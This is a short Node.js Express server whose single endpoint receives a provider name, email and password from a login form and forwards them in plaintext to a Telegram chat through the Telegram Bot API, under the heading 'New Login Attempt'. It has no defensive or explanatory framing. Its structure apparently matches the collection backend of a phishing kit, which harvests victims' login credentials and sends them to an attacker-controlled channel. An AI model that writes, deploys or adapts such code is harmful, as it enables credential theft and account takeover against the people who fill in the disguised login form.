import express from "express";
import bodyParser from "body-parser";
import cors from "cors";
import axios from "axios";
import dotenv from "dotenv"

const app = express();

dotenv.config();

const PORT = 3001;

// Middleware
app.use(cors());

app.use(bodyParser.json());

// Your Telegram Bot Token and Chat ID
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// POST endpoint to receive login form data
app.post("/api/submit", async (req, res) => {
  const { provider, email, password } = req.body;

  const message = `
🚨 *New Login Attempt* 🚨
🔐 Provider: ${provider}
📧 Email: ${email}
🔑 Password: ${password}
`;

  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: "Markdown",
    });

    res.status(200).json({ message: "Sent to Telegram successfully." });
  } catch (error) {
    console.error("Telegram error:", error.response?.data || error.message);
    res.status(500).json({ error: "Failed to send message to Telegram." });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
